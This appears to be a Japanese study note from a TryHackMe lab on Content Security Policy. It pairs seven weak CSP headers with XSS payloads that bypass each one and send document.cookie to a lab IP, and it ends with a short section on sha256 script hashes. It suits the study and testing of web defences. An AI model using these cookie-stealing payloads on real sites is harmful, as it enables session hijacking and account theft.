# CSP (Content Security Policy)

https://tryhackme.com/room/csp

https://csp-evaluator.withgoogle.com/

https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html?highlight=CSP#unsafe-csp-rules

## 設定不備と攻撃方法のパターン

### 1 unsafe-inline

```http
Content-Security-Policy: default-src * 'unsafe-inline';
```

```html
<script>fetch(`http://10.11.146.32:8000/${document.cookie}`)</script>
```

### 2 script-src data

```http
Content-Security-Policy: default-src *; style-src 'self'; script-src data:
```

```html
<script src="data:application/javascript,fetch(`http://10.11.146.32:8000/${document.cookie}`)"></script>
```

### 3 img-src

```http
Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-inline'
```

```html
<script>(new Image()).src = `http://10.11.146.32:8000/${encodeURIComponent(document.cookie)}`</script>
```

### 4 nonce, style-src

※nonceが予測不能であれば成立しない

```http
Content-Security-Policy: default-src 'none'; style-src * 'self'; script-src 'nonce-abcdef'
```

```html
<script nonce="abcdef">
  var l = document.createElement("link");
  l.rel = "stylesheet";
  l.href = "http://10.11.146.32:8000/" + encodeURIComponent(document.cookie);
  document.head.appendChild(l);
</script>
```

### 5 unsafe-eval, subdomain, JSONP

```http
Content-Security-Policy: default-src 'none'; style-src 'self'; img-src *; script-src 'unsafe-eval' *.google.com
```

```html
<script src="//accounts.google.com/o/oauth2/revoke?callback=eval(document.location='http://10.11.146.32:8000/'.concat(document.cookie))"></script>
```

### 6 cloudflare gadget

```http
Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-eval' cdnjs.cloudflare.com
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js" integrity="sha512-C4LuwXQtQOF1iTRy3zwClYLsLgFLlG8nCV5dCxDjPcWsyFelQXzi3efHRjptsOzbHwwnXC3ZU+sWUh1gmxaTBA==" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
<div ng-app ng-csp>{{$on.curry.call().document.location='http://10.11.146.32:8000/' + $on.curry.call().document.cookie}}</div>
```

### 7

```http
Content-Security-Policy: default-src 'none'; media-src *; style-src 'self'; script-src 'self'
```

```html
<script src="/'; new Audio('http://10.11.146.32:8000/' + document.cookie); '"></script>
```

## shaハッシュについて

例えば、`<script>console.log("__defend-3_REAL=true")</script>` というスクリプトのハッシュを計算するのは下記のようにする。

```
$ echo -n 'console.log("__defend-3_REAL=true")' | openssl dgst -sha256 -binary | base64
8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo=
```

最終的に

```
script-src 'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo='
```